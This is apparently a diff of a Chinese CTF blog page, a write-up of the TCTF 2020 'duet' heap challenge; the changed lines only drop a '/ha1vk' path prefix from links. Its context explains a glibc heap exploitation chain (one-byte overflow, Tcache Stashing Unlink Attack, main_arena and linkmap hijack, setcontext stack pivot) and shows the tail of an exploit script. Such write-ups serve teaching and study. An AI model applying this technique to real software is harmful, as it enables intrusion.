exploit()</span><br><span class="line">      sh.interactive()</span><br><span class="line">   <span class="keyword">except</span>:</span><br><span class="line">      sh.close()</span><br><span class="line">      <span class="built_in">print</span> <span class="string">&#x27;trying...&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="TCTF-2020-duet"><a href="#TCTF-2020-duet" class="headerlink" title="TCTF 2020 duet"></a>TCTF 2020 duet</h2><p>首先，检查一下程序的保护机制</p>
-<img src="/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image10.png" class="">
+<img src="/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image10.png" class="">
 
 <p>然后，我们用IDA分析一下</p>
 <p>在backdoor里有溢出一字节的机会，但只能用1次</p>
-<img src="/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image11.png" class="">
+<img src="/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image11.png" class="">
 
 <p>Add功能中使用的是calloc，会清空数据</p>
-<img src="/ha1vk/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image12.png" class="">
+<img src="/2020/07/26/%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81ld%E4%B8%AD%E7%9A%84linkmap%E6%9D%A5%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%B5%81/image12.png" class="">
 
 <p>我们可以利用1字节溢出构造overlap chunk，然后进行Tcache Stashing Unlink Attack将global_max_fast修改为很大，然后，我们delete一个chunk，被放到fastbin里，在main_arena里，会留下一个1，这个1，可以被我们用来伪造一个0x100的fastbin，我们控制现有的fastbin的chunk，将main_arena里伪造的串入，然后申请到main_arena控制整个main_arena。有关TCACHE Stashing Unlink attack，可以见这篇文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/105870247">https://blog.csdn.net/seaaseesa/article/details/105870247</a></p>
 <p>控制了main_arena，接下来，我们可以通过修改top chunk为任意位置的chunk处，从而分配到任意地址处，但是现在问题是，free_hook处没有可用的数据用于伪造，如果要让其有数据，还得再来一次堆攻击，但是现在堆已经混乱了，不好操作，而malloc_hook处使用one_gadget也打不通，现在一个好的方法就是劫持linkmap了，在linkmap里有很多数据可以供我们伪造chunk的size，从而分配过去。然后，利用setcontext，即可完成栈迁移，将栈一并迁移到linkmap里。</p>
@@ -334,11 +334,11 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/ha1vk/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" rel="tag"># 格式化字符串漏洞</a>
-              <a href="/ha1vk/tags/fastbin/" rel="tag"># fastbin</a>
-              <a href="/ha1vk/tags/Tcache-Stashing-Unlink-Attack/" rel="tag"># Tcache_Stashing_Unlink_Attack</a>
-              <a href="/ha1vk/tags/linkmap/" rel="tag"># linkmap</a>
-              <a href="/ha1vk/tags/dl-resolve/" rel="tag"># dl_resolve</a>
+              <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/" rel="tag"># 格式化字符串漏洞</a>
+              <a href="/tags/fastbin/" rel="tag"># fastbin</a>
+              <a href="/tags/Tcache-Stashing-Unlink-Attack/" rel="tag"># Tcache_Stashing_Unlink_Attack</a>
+              <a href="/tags/linkmap/" rel="tag"># linkmap</a>
+              <a href="/tags/dl-resolve/" rel="tag"># dl_resolve</a>
           </div>
 
         
@@ -347,11 +347,11 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/07/26/zer0pts_2020_babybof/" rel="prev" title="zer0pts_2020_babybof（一种在FULL RELRO情况下无泄漏的getshell方法）">
+    <a href="/2020/07/26/zer0pts_2020_babybof/" rel="prev" title="zer0pts_2020_babybof（一种在FULL RELRO情况下无泄漏的getshell方法）">
       <i class="fa fa-chevron-left"></i> zer0pts_2020_babybof（一种在FULL RELRO情况下无泄漏的getshell方法）
     </a></div>
       <div class="post-nav-item">
-    <a href="/ha1vk/2020/07/26/n1ctf2018_null/" rel="next" title="n1ctf2018_null（通过劫持线程arena达到任意地址分配）">
+    <a href="/2020/07/26/n1ctf2018_null/" rel="next" title="n1ctf2018_null（通过劫持线程arena达到任意地址分配）">
       n1ctf2018_null（通过劫持线程arena达到任意地址分配） <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
@@ -424,20 +424,20 @@
 <div class="site-state-wrap motion-element">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
-          <a href="/ha1vk/archives/">
+          <a href="/archives/">
         
           <span class="site-state-item-count">233</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
-            <a href="/ha1vk/categories/">
+            <a href="/categories/">
           
         <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/ha1vk/tags/">
+            <a href="/tags/">
           
         <span class="site-state-item-count">145</span>
         <span class="site-state-item-name">标签</span></a>
@@ -510,30 +510,30 @@
   </div>
 
   
-  <script src="/ha1vk/lib/anime.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/ha1vk/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/ha1vk/js/motion.js"></script>
-
-
-<script src="/ha1vk/js/schemes/muse.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/ha1vk/js/next-boot.js"></script>
+<script src="/js/schemes/muse.js"></script>
 
 
-
-
-  
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
